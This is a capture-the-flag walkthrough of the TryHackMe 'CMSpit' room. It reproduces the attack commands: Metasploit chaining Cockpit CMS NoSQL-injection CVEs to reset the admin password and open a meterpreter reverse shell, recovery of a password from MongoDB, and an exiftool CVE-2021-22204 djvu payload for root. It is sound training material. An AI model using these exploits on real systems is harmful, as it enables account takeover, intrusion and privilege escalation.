---
author: "Shebu"
title: "CMSpit: THM"
date: "2021-12-25"
tags: ["cockpit-cms", "CVE-2021-22204","CVE-2020-35848", "CVE-2020-35847", "exiftool", "mongodb"]
cover:
    image: img/cmspit.jpg
    # can also paste direct link from external site
    # ex. https://i.ibb.co/K0HVPBd/paper-mod-profilemode.png
    alt: "<alt text>"
    caption: "<text>"
    relative: true # To use relative path for cover image, used in hugo Page-bundles
---

# Description
------------------
This is a machine that allows you to practise web app hacking and privilege escalation using recent vulnerabilities.
You've identified that the CMS installed on the web server has several vulnerabilities that allow attackers to enumerate users and change account passwords.

Your mission is to exploit these vulnerabilities and compromise the web server.

|  **Room name** 	| CMSpit                                           	|
|:--------------:	|----------------------------------------------------	|
|     **OS**     	| Linux                                              	|
| **Difficulty** 	| Medium                                             	|
|  **Room Link** 	| https://tryhackme.com/room/cmspit               	|
|   **Creator**  	| [stuxnet](https://tryhackme.com/p/stuxnet) 	|

# Recon

-------------------

## Portscan 

```bash
sh3bu@VM:~/thm/cmspit$ rustscan -a cmspit.thm --range 0-65535 -- -sV -sC -oN cmspit.nmap 

# Nmap 7.80 scan initiated Fri Dec 24 22:28:19 2021 as: nmap -vvv -p 22,80 -sV -sC -oN /home/sh3bu/thm/cmspit/cmspit.nmap 10.10.55.236

Nmap scan report for 10.10.55.236

Host is up, received syn-ack (0.37s latency).

Scanned at 2021-12-24 22:28:20 IST for 32s

PORT   STATE SERVICE REASON  VERSION

22/tcp open  ssh     syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 7f:25:f9:40:23:25:cd:29:8b:28:a9:d9:82:f5:49:e4 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQD7acH8krj6oVh6s+R3VYnJ/Xc8o5b43RcrRwiMPKe7V8V/SLfeVeHtE06j0PnfF5bHbNjtLP8pMq2USPivt/LcsS+8e+F5yfFFAVawOWqtd9tnrXVQhmyLZVb+wzmjKe+BaNWSnEazjIevMjD3bR8YBYKnf2BoaFKxGkJKPyleMT1GAkU+r47m2FsMa+l7p79VIYrZfss3NTlRq9k6pGsshiJnnzpWmT1KDjI90fGT6oIkALZdW/++qXi+px6+bWDMiW9NVv0eQmN9eTwsFNoWE3JDG7Aeq7hacqF7JyoMPegQwAAHI/ZD66f4zQzqQN6Ou6+sr7IMkC62rLMjKkXN
|   256 0a:f4:29:ed:55:43:19:e7:73:a7:09:79:30:a8:49:1b (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBEnbbSTSHNXi6AcEtMnOG+srCrE2U4lbRXkBxlQMk1damlhG+U0tmiObRCoasyBY2kvAdU/b7ZWoE0AmoYUldvk=
|   256 2f:43:ad:a3:d1:5b:64:86:33:07:5d:94:f9:dc:a4:01 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKYUS/4ObKPMEyPGlgqg6khm41SWn61X9kGbNvyBJh7e

80/tcp open  http    syn-ack Apache httpd 2.4.18 ((Ubuntu))
|_http-favicon: Unknown favicon MD5: C9CD46C6A2F5C65855276A03FE703735
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-title: Authenticate Please!
|_Requested resource was /auth/login?to=/
|_http-trane-info: Problem with XML parsing of /evox/about

Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .

# Nmap done at Fri Dec 24 22:28:52 2021 -- 1 IP address (1 host up) scanned in 33.18 seconds
```
So there are 2 ports open as usual 22 & 80

## Website: Port 80

The home page of this website redirects to  url `http://cmspit.thm/auth/login?to=/` and it looks like this

## login page

*[Image: website1]*
A normal login page with username & password .

## forgot-password page

Forgot password page at `http://cmspit.thm/auth/forgotpassword`

*[Image: website2]*

Wappalyzer didnt reveal much info on version of this CMS.
Taking a close look at the source code reveals the version information of `cockpit-cms` which is `0.11.1`

*[Image: website3]*

# Shell as www-data
-------------------------------

Googling for exploits for  `CMSpit 0.11.1` revealed that there are 2 CVE's which on combined together can help us to get a foothold on the machine

* **CVE-2020-35848 & CVE-2020-35847**: Cockpit CMS before version 0.11.2 is vulnerable to a NoSQL Injection vulnerability in the `/auth/resetpassword` and `/auth/newpassword` that allows extraction of password reset tokens which allow for user details enumeration as well as password reset

## msf 

```bash
msf6 > search cockpit

Matching Modules
================

   #  Name                                Disclosure Date  Rank    Check  Description
   -  ----                                ---------------  ----    -----  -----------
   0  exploit/multi/http/cockpit_cms_rce  2021-04-13       normal  Yes    Cockpit CMS NoSQLi to RCE

Interact with a module by name or index. For example info 0, use 0 or use exploit/multi/http/cockpit_cms_rce

msf6 > use 0
[*] No payload configured, defaulting to php/meterpreter/reverse_tcp
msf6 exploit(multi/http/cockpit_cms_rce) > show options

Module options (exploit/multi/http/cockpit_cms_rce):

   Name        Current Setting  Required  Description
   ----        ---------------  --------  -----------
   ENUM_USERS  true             no        Enumerate users
   Proxies                      no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                       yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT       80               yes       The target port (TCP)
   SSL         false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI   /                yes       The URI of Cockpit
   USER                         no        User account to take over
   VHOST                        no        HTTP server virtual host

Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.0.2.15        yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port

Exploit target:

   Id  Name
   --  ----
   0   Automatic Target

msf6 exploit(multi/http/cockpit_cms_rce) > set LHOST tun0
LHOST => tun0
msf6 exploit(multi/http/cockpit_cms_rce) > set RHOSTS cmspit.thm
RHOSTS => cmspit.thm

msf6 exploit(multi/http/cockpit_cms_rce) > run

[*] Started reverse TCP handler on 10.17.6.87:4444 
[*] Attempting Username Enumeration (CVE-2020-35846)
[+]   Found users: ["admin", "darkStar7471", "skidy", "ekoparty"]
[-] Exploit aborted due to failure: bad-config: 10.10.103.36:80 - User to exploit required
[*] Exploit completed, but no session was created.
```

Now we have  4 users `admin`, `darkStar7471`, `skidy` and `ekoparty`.

Onto the second part of the exploit i.e password reset

Update the `USER` value in msf to `admin` to reset admin's password and re-run the exploit to get a shell !

```bash
msf6 exploit(multi/http/cockpit_cms_rce) > set USER admin
USER => admin
msf6 exploit(multi/http/cockpit_cms_rce) > run

[*] Started reverse TCP handler on 10.17.6.87:4444 
[*] Attempting Username Enumeration (CVE-2020-35846)
[+]   Found users: ["admin", "darkStar7471", "skidy", "ekoparty"]
[*] Obtaining reset tokens (CVE-2020-35847)
[+]   Found tokens: ["rp-d72d501f6207ac757ac3cb114d1a0a4760a88abe28f23"]
[*] Checking token: rp-d72d501f6207ac757ac3cb114d1a0a4760a88abe28f23
[*] Obtaining user info
[*]   user: admin
[*]   name: Admin
[*]   email: admin@yourdomain.de
[*]   active: true
[*]   group: admin
[*]   password: $2y$10$dChrF2KNbWuib/5lW1ePiegKYSxHeqWwrVC.FN5kyqhIsIdbtnOjq
[*]   i18n: en
[*]   _created: 1621655201
[*]   _modified: 1621655201
[*]   _id: 60a87ea165343539ee000300
[*]   _reset_token: rp-d72d501f6207ac757ac3cb114d1a0a4760a88abe28f23
[*]   md5email: a11eea8bf873a483db461bb169beccec
[+] Changing password to A98N9259vM
[+] Password update successful
[*] Attempting login
[+] Valid cookie for admin: 8071dec2be26139e39a170762581c00f=urekd0hbqla32mqdr1rq1ppnhm;
[*] Attempting RCE
[*] Sending stage (39282 bytes) to 10.10.103.36
[*] Meterpreter session 1 opened (10.17.6.87:4444 -> 10.10.103.36:38906) at 2021-12-25 08:22:49 -0500

meterpreter > shell
Process 916 created.
Channel 0 created.
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

There are 2 users on the machine `stux` & `root`
```bash
www-data@ubuntu:/var/www/html/cockpit/assets/app/js$ cat /etc/passwd | grep "bash"       

root:x:0:0:root:/root:/bin/bash
stux:x:1000:1000:Coock,,,:/home/stux:/bin/bash
```
## webflag 🚩

Grab the web flag which is in the home dir of **www-data**
```bash
www-data@ubuntu:/var/www/html/cockpit$ cat webflag.php

<?php

        $flag = "thm{f158bea7*************55626d78e9fb}";
?>
```
# Shell as Stux 
------------------------

Time to escalate ! I quickly transferred linpeas to the target machine & ran it.

*[Image: termninal1]*

## MongoDB

Seems that `MongoDB` is running internally.We can confirm that by netstat command
```bash
www-data@ubuntu:/var/www/html/cockpit$ netstat -tulpn

(Not all processes could be identified, non-owned process info will not be shown, you would have to be root to see it all.)

Active Internet connections (only servers)

Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name

tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -               

tcp        0      0 127.0.0.1:27017         0.0.0.0:*               LISTEN      -               

tcp6       0      0 :::80                   :::*                    LISTEN      -               

tcp6       0      0 :::22                   :::*                    LISTEN      -               

udp        0      0 0.0.0.0:68              0.0.0.0:*                         
```
> MongoDB runs on port 27017 by default

We use MongoDB cli to retreive password for stux stored in it

>If you are not familiar with MongoDB commands, refer this: https://docs.mongodb.com/manual/reference/mongo-shell/

```sql
stux@ubuntu:~$ mongo

MongoDB shell version: 2.6.10

connecting to: test

> show dbs

admin         (empty)
local         0.078GB
sudousersbak  0.078GB

> use sudousersbak

switched to db sudousersbak

> show collections

flag
system.indexes
user

> db.user.find()

{ "_id" : ObjectId("60a89d0caadffb0ea68915f9"), "name" : "p******23" }
{ "_id" : ObjectId("60a89dfbaadffb0ea68915fa"), "name" : "stux" }
```
## user.txt 🚩

Now since we have the password for user `stux` ,let's SSH in to machine as **STUX** & grab the `user.txt`  !

```bash
sh3bu@VM:~/thm/cmspit$ ssh stux@cmspit.thm

stux@cmspit.thm's password: 

Welcome to Ubuntu 16.04.7 LTS (GNU/Linux 4.4.0-210-generic x86_64)

 * Documentation:  https://help.ubuntu.com

 * Management:     https://landscape.canonical.com

 * Support:        https://ubuntu.com/advantage

Last login: Sat May 22 19:41:38 2021 from 192.168.85.1

stux@ubuntu:~$ id

uid=1000(stux) gid=1000(stux) groups=1000(stux),4(adm),24(cdrom),30(dip),46(plugdev),114(lpadmin),115(sambashare)

stux@ubuntu:~$ cat user.txt

thm{c5fc72c4**********a05f0ce}
```
# Shell as root
----------------------

Running `sudo -l` revealed that we could run `exiftool` as root.

We could refer [**GTFOBINS**](https://gtfobins.github.io/gtfobins/exiftool/#sudo) for sudo entry on exiftool binary to escalate our privileges to root !

## Exiftool CVE

But for the sake of this room, we use a vulnerability on exiftool to escalate our privileges to root.
Googling for exiftool cve show us this: `CVE-2021-22204` 

>You could read more about this CVE here -https://blog.convisoappsec.com/en/a-case-study-on-cve-2021-22204-exiftool-rce/
>
>Link to exploit on github: https://github.com/convisoappsec/CVE-2021-22204-exiftool

Steps to escalate -

```
1. Create a file named payload with contents - (metadata "\c${system('/bin/bash -p')};")
2. bzz payload payload.bzz
3. djvumake exploit.djvu INFO='1,1' BGjp=/dev/null ANTz=payload.bzz
4. sudo exiftool exploit.djvu
```
## root.txt 🚩

Now we get have a root shell ! Grab `root.txt` 

```bash
root@ubuntu:~# whoami

root

root@ubuntu:~# cat  /root/root.txt

thm{bf52a85b**********0d4d5ada}
```
